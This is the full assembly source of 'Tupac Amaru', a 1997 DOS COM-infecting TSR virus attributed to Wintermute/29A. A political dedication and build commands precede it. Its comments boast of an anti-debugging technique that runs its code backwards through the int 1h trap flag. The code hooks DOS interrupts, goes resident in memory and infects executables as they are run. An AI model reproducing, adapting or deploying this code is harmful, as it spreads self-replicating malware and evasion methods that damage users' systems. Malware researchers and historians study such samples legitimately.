   ; ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²±
   ;²²±                       .:. .: .:..: :. : .. ::..                      ²²±
   ;²±   Virus: Tupac Amaru  . ÜÛÛÛÛÛÜ.ÜÛÛÛÛÛÜ.ÜÛÛÛÛÛÜ..  Author: Wintermute  ²±
   ;²±       Size: 1308     ::.ÛÛÛ ÛÛÛ:ÛÛÛ ÛÛÛ.ÛÛÛ ÛÛÛ:.:    Group: 29A       ²±
   ;²±   Date: August, 1997 .: .ÜÜÜÛÛß.ßÛÛÛÛÛÛ:ÛÛÛÛÛÛÛ .:. Origin: Espa¤a     ²±
   ;²±                     >===ÛÛÛÜÜÜÜ=ÜÜÜÜÛÛÛ=ÛÛÛ=ÛÛÛ===->>                  ²±
   ;²±                   .: .:.ÛÛÛÛÛÛÛ:ÛÛÛÛÛÛß.ÛÛÛ ÛÛÛ: .:.:..                ²±
   ;²²±                ..: ::. . .:.. .: ..:.::.. .:.. :.. :.:..             ²²±
   ; ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²±
   ;
   ;  This virus itself is just a COM TSR virus... but... the innovation it has
   ; justifies the whole virus as something really  cool  and  new... it's  the
   ; first virus ever in the world that executes its code **BACKWARDS**.
   ;
   ;  By means of int 1h, it executes one  instruction, reverses the opcodes of
   ; the next one ( which is actually the one before :) ) and  sets IP  to that
   ; position, reversing  again  the instruction  that has  been just executed.
   ;
   ; Let's imagine Tupac at this position:
   ;
   ;       db  0c7h, 08eh
   ; ÄÄÄ  mov ax,2521h
   ;       [...]
   ;
   ;  Just after  the "mov ax,2521h" is  executed, the compiler  will set CS:IP
   ; for the next instruction and then call int 1h. Then, we'll move that value
   ; into DS:SI, substracting to SI the  size of "mov ax,2521h" (three bytes in
   ; this example; this size is known because the instruction length is checked
   ; during the last call before this one).
   ;
   ;  We decrement SI by one, so we  point to "08eh". The engine will then load
   ; this  opcode and find  the corresponding  instruction length, getting 2 as
   ; result, and thus picking two bytes ( 08eh and the previous one, 0c7h ). So
   ; that, it will substract 2 to SI, push  the instruction opcodes, and pop'em
   ; backwards, changing  the CS:IP stored in  the  stack in  order to point to
   ; this  instruction. Also, it will  reverse the instruction  which has  just
   ; been executed ( mov ax,2521h ).
   ;
   ;  For every int 21h call, Tupac  uses the "nop" instruction, 090h. It saves
   ; bytes, and also a good amount of time when trying to solve many problems.
   ;
   ;  Conditional jumps  are checked before  they're executed: if the reversing
   ; engine has just decrypted the instruction before it, the updated CS:IP and
   ; encrypted the next, it's obvious  that the virus will hang. So, the engine
   ; checks  the flags... jump is  made  three bytes  after the  instruction it
   ; should jump to ( cause 2+1 will be substracted in order to get to the last
   ; opcode of the instruction we want to execute ).
   ;
   ;  This is  because  Tupac  executes  backwards, making  impossible  for any
   ; debugger to  trace it; MS-DOS debug, GameTools, Soft-ICE and TurboDebugger
   ; just get lost... the only way I found to check how the virus worked was by
   ; guessing  with  some tricks  and  using  AVPUtil ( fucking  good  program,
   ; Kasp! ). All  the  debugging  programs  I  know ( including AVPUtil if you
   ; are not  modifying all  the time CS:IP  in  order to  execute  the correct
   ; instructions ) will  continue  executing the  whole code  forwards without
   ; realising  about wtf's really happening there ( and this obviously happens
   ; with AV software as well ).
   ;
   ;  The virus is dedicated to the revolutionary  group  Tupac  Amaru  members
   ; who were killed after surrendering by the  Peruvian  army  forces  in  the
   ; attack to the japanese embassy in  Per£,  Lima.  The  rebels  surrendered,
   ; and Fujimori's men killed them one by one; the embassy  was  burning  with
   ; the rebels inside it - among them a 16 year  old  girl  -  while  Fujimori
   ; was congratulating his troops and  singing  the  peruvian  national  hymn,
   ; talking with journalists to raise more popular and win the next elections.
   ;
   ;  Also dedicated ( as so dedicated as it is to Tupac Amaru killed members )
   ; to the miners that excavated the tunnel to the embassy  for  the  gov  and
   ; later  "dissapeared",  and  to  all  of  Fujimori's  victims:  dissapeared
   ; students, tortured "enemies", and people who fight for democracy there...
   ;
   ;  Well, also to all the people in the world that are  punished  because  of
   ; talking about democracy and human rights :)
   ;
   ;   Also some greetings to AVV, who told me about an  idea  about  executing
   ; a decrypting routine backwards... idea I took, gave form,  extended  to  a
   ; complete virus,... and finally brought ya ;)
   ;
   ;
   ;         ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;             Habr  un d¡a en que todos, al levantar la vista,
   ;                  veremos una tierra, que ponga libertad.
   ;                Sonar n las campanas desde los campanarios,
   ;                 y los campos desiertos, volveran a granar,
   ;                unas espigas altas, dispuestas para el pan.
   ;            Para un pan que en los siglos, nunca fue repartido,
   ;               entre todos aquellos, que hicieron lo posible,
   ;                por empujar la historia, hacia la libertad.
   ;                    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;                        ( from a revolution song )
   ;
   ;
   ;   tasm tupac.asm /m2
   ;   tlink tupac.obj
   ;   x2b tupac.exe tupac.com         ; An utility near Exe2bin
   ;   del tupac.exe


   .286
   kodigo segment 'code'
   assume cs:kodigo,ds:kodigo,es:kodigo
   org 00h

   tupac_start label byte

   Tupac_amaru:

                   call    delta
   delta:          mov     si,sp                   ; We take the delta-offset
                   mov     bp,word ptr [si]
                   sub     bp,3

   backtrace:
                   mov     byte ptr cs:[installing_on+bp],0

                   mov     ax,3521h
                   int     21h
                   mov     word ptr [int21h+bp],bx
                   mov     word ptr [int21h+2+bp],es

                   mov     dx,bx
                   push    es
                   pop     ds
                   mov     ax,25a9h
                   int     21h
                   push    cs
                   pop     ds

                   mov     ax,3501h                ; Get 1h
                   int     21h
                   mov     word ptr [int1h+2+bp],es
                   mov     word ptr [int1h+bp],bx
                   lea     dx,back_zone+bp   ; Set it to the zone that's going
                   mov     ah,25h            ;to control the backwards execution
                   int     21h

                   cli
                   pushf                       ; Now we set trap flag to 1
                   pop     ax
                   or      ah,1h
                   push    ax
                   popf

                   jmp     end_or_init     ; To the beginning ( or end ? ;D )
                                           ;of the code


   return:         dw      0       ; For the push/pop of all regs
   instanterior:   db      1       ; Just executed instruction bytes
   installing_on:  db      0       ; Backtrace working ?

   offset_jmp:     dw      0
   hay_salto:      db      0       ;  1.- Interrupt 21h
                                   ;  2,3.- Jump

   salto:          db 090h,0e9h
   lugarsalto:     db 00h,00h      ;  Jump to virus code
   buffer:         db 53h,53h,0cdh,20h     ;  Buffer with host bytes

   virus_name:     db ' The Tupac Amaru virus, dedicated to all the people of '
                   db 'the MRTA who were killed by Fujimori''s troops after '
                   db 'surrendering at the japanese embassy on Lima, to all '
                   db 'the people killed and tortured in his government, and '
                   db 'finally to all those who work for democracy and for a '
                   db 'better world.',0

   _Winter_:       db 'Wintermute/29A',0


   ; ***************************************************************************
   ;                         RESIDENCE ROUTINE ZONE
   ; ***************************************************************************
   ;
   ;   You should read this next backwards ;)

                   db      0c3h
                   db      0a5h
                   db      0a5h
                   db      057h
                   db      01h,00h,0bfh
                   db      01h,00h,offset buffer+1,0aeh,080h
                   db      offset buffer
                   db      076h,08dh
                   db      01fh
                   db      07h
                   db      0eh,0eh

   jmp1:                   ; Restore first four bytes

                   db      090h
                   db      01fh,06h
                   db      025h,021h,0b8h
                   db      place_ff
                   db      place_21-(place_ff*100h)
                   db      0bah

                           ; Int 21h setting

   jjmp7:          db      ((offset jmp7)-(offset jjmp7)),075h
                   db      49h
                   db      0a4h
   jmp7:
                   db      tupac_ff
                   db      tupac_size-(tupac_ff*100h)
                   db      0b9h
                   db      0eeh,089h
                   db      0ffh,031h
                   db      0c7h,08eh
                   db      047h
                   db      00h,03h,03eh,03h,026h

                           ; Copy virus to memory

                   db      tupac_parag
                   db      00h,03h,02eh,083h,026h
   jjmp6:          db      0-((offset jjmp6)-(offset jmp1)),072h
                   db      tupac_parag
                   db      00h,03h,03eh,080h,026h

                           ; Some checks
   jmp4:
   jjmp5:          db      0-((offset jjmp5)-(offset jmp1)),075h
                   db      00h,01h,016h,039h,026h
   jjmp4:          db      0ffh-((offset jjmp4)-(offset jmp4))+1,074h
                   db      00h,00h,01h,03eh,083h,026h
                   db      0dah,08ch

                           ; We check if we fit in memory: if last Mcb is
                           ;empty or it's program Psp

   jmp2:
                   db      ((offset jmp3)-(offset jmp2)),0ebh
                   db      0c7h,08eh
                   db      047h
                   db      00h,03h,03eh,03h,026h
   jjmp2:          db      0h-((offset jjmp2)-(offset jmp2)),074h
                   db      05ah,00h,00h,03eh,080h,026h
   jmp3:
                           ; Mcb Loop: Search for Mcb Z

                   db      0c7h,08eh
                   db      0eh,07fh,08bh,026h
                   db      0c0h,08eh
                   db      048h
                   db      0c0h,08ch
                   db      090h
                   db      052h,0b4h

                           ; Search for the list of lists

   jjmp1:          db      0-((offset jjmp1)-(offset jmp1))
                   db      074h
                   db      0c0h,0c0h,03dh
                   db      090h
                   db      0c0h,0c0h,0b8h

                           ; Installation check

   end_or_init:
                   nop                     ; The 'nop' is the signal for the
                                           ;virus to start executing backwards
                   cli                     ; We don't want TbClean here, do we ?
                   neg     sp
                   neg     sp
                   sti

                   mov     di,100h         ; Restore bytes and return to host:
                   mov     ax,word ptr [buffer+bp]  ; there's a debugger out
                   mov     word ptr cs:[100h],ax    ; there... whoooo, I'm
                   mov     ax,word ptr [buffer+bp+2]; afraid ! :)
                   mov     word ptr cs:[102h],ax
                   jmp     di

   push_em_all:    cli                               ; We save registers
                   pop     cs:word ptr [return+bp]
                   pushf
                   push    ax bx cx dx di si ds bp es
                   push    cs:word ptr [return+bp]
                   sti
                   ret

   pop_em_all:     cli                              ; We recover registers
                   pop     cs:word ptr [return+bp]
                   pop     es bp ds si di dx cx bx ax
                   popf
                   push    cs:word ptr [return+bp]
                   sti
                   ret

   back_zone:      ; Backwards executor zone ( where int 1h is attached )

                   call    push_em_all

                   mov     di,sp                    ; We got on DS:DI now the
                   mov     si, word ptr ss:[di+20d] ;CS:IP has sent to the stack
                   mov     ds, word ptr ss:[di+22d] ;
                   mov     bx,word ptr ss:[di+24d]  ; Pushed flags register

                   dec     si
                   lodsb
                   cmp     al,90h          ; Nop will tell us when does the
                   jnz     continua        ;executing start; installing_on is
                   mov     byte ptr cs:[installing_on+bp],1  ;a flag that tells
                                                          ;we have to backtrace

   continua:
                   cmp     byte ptr cs:[installing_on+bp],0
                   jnz     @adelante
                   jmp     vamonos
   @adelante:

                   ; In AL we've got the first byte of the instruction we've
                   ;just executed, but we cannot do nothin with this. First,
                   ;we'll decrement ds:si, and sub si the last instruction
                   ;size and which at the start lasts one byte ( the nop ),
                   ;so we'll be at the first opcode of the backwards stored
                   ;instructions we're going to execute.

                   xor     dx,dx
                   mov     dl,byte ptr cs:[instanterior+bp]
                   inc     dl
                   sub     si,dx           ; So, DS:SI now points to the opcode
                                           ;that will be the start of the next
                                           ;backwards instruction

                   xor     cx,cx

                   lodsb                   ; We load that opcode in Al, and
                                           ;check it with the table to verify
                                           ;it's lenght: only the opcodes used
                                           ;by the virus are checked.
   @dsescsss:
                   mov     ah,al


                   push    si cx ds cs     ; Table
                   pop     ds

                   lea     si,inittable1+bp
                   mov     cx,57d
   @buscaopcode:
                   lodsb                   ; Searches opcode in table
                   cmp     ah,al
                   jz      @encontrado
                   loop    @buscaopcode

   @encontrado:
                   push    cx              ; Searches where to jump
                   lea     si,inittable2+bp
                   mov     cx,114d
                   pop     dx
                   sub     cx,dx
                   sub     cx,dx
                   add     si,cx
                   lodsw
                   add     ax,bp
                   pop     ds cx si
                   jmp     ax


   inittable1:
                   db      03h,07h,0eh,01fh,026h,03dh,047h,048h,057h,074h,080h
                   db      08bh,08ch,08dh,08eh,0c3h,0cdh,0a5h,0b4h,0b8h,0bfh
                   db      0ebh,090h,083h,039h,075h,072h,031h,089h,0b9h,049h
                   db      06h,0bah,0a4h,0f8h,087h,06h,053h,0b4h,050h,058h
                   db      05ah,08eh,03ch,0ach,046h,051h,052h,059h,0a0h,02h
                   db      099h,02dh,0a3h,040h,0feh,073h

   ;;;;;;;;;;;;;;;;;

   inittable2:

                   dw      offset @bytes4, offset @bytes1, offset @bytes1
                   dw      offset @bytes1, offset @prefijo, offset @bytes3
                   dw      offset @bytes1, offset @bytes1, offset @bytes1
                   dw      offset @jjz, offset @bytes5, offset @bytes3
                   dw      offset @bytes2, offset @bytes3, offset @bytes2
                   dw      offset @finished_go, offset @bytes2, offset @bytes1
                   dw      offset @bytes2, offset @bytes3, offset @bytes3
                   dw      offset @jmp2aplace, offset @makeint, offset @bytes5
                   dw      offset @bytes4, offset @jjnz, offset @jjb
                   dw      offset @bytes2, offset @bytes2
                   dw      offset @bytes3, offset @bytes1, offset @bytes1
                   dw      offset @bytes3, offset @bytes1, offset @end_infect
                   dw      offset @bytes2, offset @bytes1, offset @bytes1
                   dw      offset @bytes2, offset @bytes1, offset @bytes1
                   dw      offset @bytes1, offset @bytes2, offset @bytes2
                   dw      offset @bytes1, offset @bytes1, offset @bytes1
                   dw      offset @bytes1, offset @bytes1, offset @bytes3
                   dw      offset @bytes4, offset @bytes1, offset @bytes3
                   dw      offset @bytes3, offset @bytes1, offset @bytes4
                   dw      offset @jjnb

   @prefijo:
                   inc     cx
                   dec     si
                   dec     si
                   lodsb
                   inc     si
                   jmp     @dsescsss

   @makeint:
                   mov     byte ptr cs:[hay_salto+bp],1
                   jmp     @bytes1

   @finished_go:
                   mov     ds,word ptr [int1h+2+bp]
                   mov     dx,word ptr cs:[int1h+bp]
                   mov     ax,2501h
                   int     21h
                   and     byte ptr ss:[di+25d],0feh
                   mov     word ptr ss:[di+20d],0100h
                   call    pop_em_all
                   iret

   @end_infect:
                   mov     ds,word ptr cs:[int1h+2]
                   mov     dx,word ptr cs:[int1h]
                   mov     ax,2501h
                   int     21h
                   and     byte ptr ss:[di+25d],0feh
                   mov     word ptr ss:[di+20d],offset @@realend
                   call    pop_em_all
                   iret

   @@realend:
                   call    pop_em_all
                   mov     bp,word ptr cs:[bp_site]
                   jmp     int21jump

   @jjnb:
                   and     bl,00000001b    ; Conditional jnb jump check
                   jnz     @bytes2
                   jmp     @jmp2aplace

   @jjb:
                   and     bl,00000001b    ; Conditional jb jump check
                   jz      @bytes2
                   jmp     @jmp2aplace

   @jjnz:
                   and     bl,01000000b    ; Conditional jnz jump check
                   jnz     @bytes2
                   jmp     @jmp2aplace

   @jjz:
                   and     bl,01000000b    ; Are we going to make the jump jz ?
                   jz      @bytes2         ; If zero flag isn't on, we take it
                                           ;as a normal 2 bytes instruction
   @jmp2aplace:
                   mov     byte ptr cs:[hay_salto+bp],3
                                           ; To interpret well next instruction
                   mov     bx,si           ; And we put the instruction offset
                                           ;at [offsetjmp] to recode it on the
                                           ;next pass
                   dec     bx
                   dec     bx
                   mov     word ptr cs:[offset_jmp+bp],bx
                   jmp     @bytes2         ; Nothing to do now... let's leave
                                           ;the jump execute and then we'll
                                           ;do things ;)

   @bytes5:        inc     cx
   @bytes4:        inc     cx
   @bytes3:        inc     cx
   @bytes2:        inc     cx              ; Cx has instruction lenght
   @bytes1:        inc     cx

                   mov     dh, byte ptr cs:[instanterior+bp]
                   mov     byte ptr cs:[instanterior+bp],cl

                   mov     dl,cl

                   sub     si,cx           ; We place SI at the end of the
                   mov     di,cx           ;backwards instruction ( ok, at the
                                           ;begin ;) )

   @loop_guardar:  lodsb                   ; We store each opcode in Al, on the
                   push    ax              ;stack
                   loop    @loop_guardar

                   mov     cx,di
                   sub     si,cx
                   mov     di,si
                   push    ds
                   pop     es

                   xor     bx,bx
                   mov     bl,cl

   @loop_reponer:  pop     ax              ; We take from the stack all opcodes
                   stosb                   ;and place them in a correct form
                   loop    @loop_reponer
                   mov     di,sp
                   mov     word ptr ss:[di+20d],si ; And now we place Si, the
                                           ;instruction we're executing next

                   add     si,bx
                   mov     cl,dh

                   cmp     byte ptr cs:[hay_salto+bp],2
                   jnz     @sec_loop
                   mov     si,word ptr cs:[offset_jmp+bp]
                   mov     byte ptr cs:[hay_salto+bp],0


   @sec_loop:      lodsb                   ; Now we're codyfing the just
                   push    ax              ;executed instruction, "backwarding"
                   loop    @sec_loop       ;it; it will be exactly as it was.

                   mov     cl,dh
                   sub     si,cx
                   mov     di,si
   @sec_store:     pop     ax              ; So we store backwards
                   stosb
                   loop    @sec_store

   vamonos:
                   cmp     byte ptr cs:[hay_salto+bp],3 ; Ok, this was the inst
                   jnz     vamos_ya                     ;just before the jump,
                   dec     byte ptr cs:[hay_salto+bp]   ;so it will be the next
                                                        ;executing
   vamos_ya:
                   call    pop_em_all
                   pushf

                   cmp     byte ptr cs:[hay_salto+bp],1
                   jnz     @return
                   mov     byte ptr cs:[hay_salto+bp],0
                   sti
                   int     0a9h                        ; Int 21h
                   cli

   @return:
                   popf
                                           ; Pop registers and go
                   iret


   ;***************************************************************************
   ;                             FILE INFECTION
   ;***************************************************************************


           db      0f8h                ; "End of infection" mark

           db      090h
           db      01fh,05ah,058h

                       ; Restore int24h
   @jmp3:
           db      90h
           db      03eh,0b4h

           db      90h
           db      40h
           db      058h
           db      05ah
           db      059h

   @close:
           db      90h
           db      00,offset salto,0bah
           db      00h,04h,0b9h
           db      040h,0b4h

           db      090h
           db      099h
           db      0c9h,031h
           db      042h,00h,0b8h
                       ; Now to the init

           db      90h
           db      tupac_ff
           db      tupac_size-(tupac_ff*100h)
           db      0b9h
           db      0d2h,031h
           db      040h,0b4h

                   ; Attach to the end

           db      00h,offset lugarsalto,0a3h
           db      00h,04h,02dh

   @len:   db      0-((offset @len)-(offset @close)),073h
           db      0c3h,050h,03dh

           db      90h
           db      099h
           db      0c9h,031h
           db      042h,02h,0b8h

           db      00h,offset buffer+1,06h,0feh
   @jjmp4: db      0-((offset @jjmp4)-(offset @close))
           db      074h

           db      0a7h,3ch
           db      00h,offset buffer+1,06h,02h

   @jjmp5: db      0-((offset @jjmp5)-(offset @close))
           db      074h
           db      090h,03ch
           db      00h,offset buffer,0a0h

           db      90h
           db      00,offset buffer,0bah
           db      00h,04h,0b9h
           db      03fh,0b4h
           db      01fh
           db      0eh

                       ; Read first four bytes

           db      051h
           db      052h
           db      090h
           db      050h
           db      057h,00h,0b8h

                       ; Save the date

           db      0c3h,087h
           db      090h
           db      03dh,02h,0b8h

   @jmp1:              ; Open file

           db      0f2h,089h
           db      0d9h,08eh

           db      090h
           db place_ff24
           db place_21-(place_ff24*100h)
           db      0bah
           db      01fh
           db      0eh
           db      050h
           db      025h,0b4h
           db      06h
           db      053h
           db      090h
           db      035h,024h,0b8h
           db      0d9h,08ch
           db      0f2h,087h

                           ; Save the int 24h

   start_infecting:        nop                 ; Infection start

               ;**********************************
               ;         INT 21H HANDLER
               ;**********************************

   in21 label byte
   INT21HANDLER:
                   cmp     ax,0c0c0h
                   jz      i_check
                   cmp     ax,4b00h
                   jz      infect
                   jmp     int21jump

   i_check:
                   iret

   infect:
                   mov     word ptr cs:[bp_site],bp
                   xor     bp,bp
                   call    push_em_all
                   mov     byte ptr cs:[installing_on],0

   init_1:
                   push    ds dx

                   push    cs
                   pop     ds
                   mov     ax,3501h        ; Get int1h
                   int     21h
                   mov     word ptr [int1h+2],es
                   mov     word ptr [int1h],bx
                   push    cs
                   pop     es
                   lea     dx,back_zone    ; Redirect it to the zone that's
                   mov     ax,2501h        ;going to control backwards execution
                   int     21h

                   cli
                   pushf                   ; Trap flag = 1
                   pop     ax
                   or      ah,1h
                   push    ax
                   popf

                   pop     dx ds

   @continue:
                   jmp     start_infecting

   int1h:          dw      0,0

   bp_site:        dw      0

   int21jump:      db      0eah
   int21h:         dw      0,0

   in24 label byte
       the24:      mov     al,3
                   iret

                   nop

   place_21 equ in21-tupac_start
   place_ff equ (place_21/0100h)
   place_24 equ in24-tupac_start
   place_ff24 equ (place_24/0100h)
   tupac_end label byte
   tupac_size equ tupac_end-tupac_start
   tupac_parag equ ((tupac_size+15)/16)+2
   tupac_ff equ (tupac_size/0100h)

   kodigo ends
   end tupac_amaru
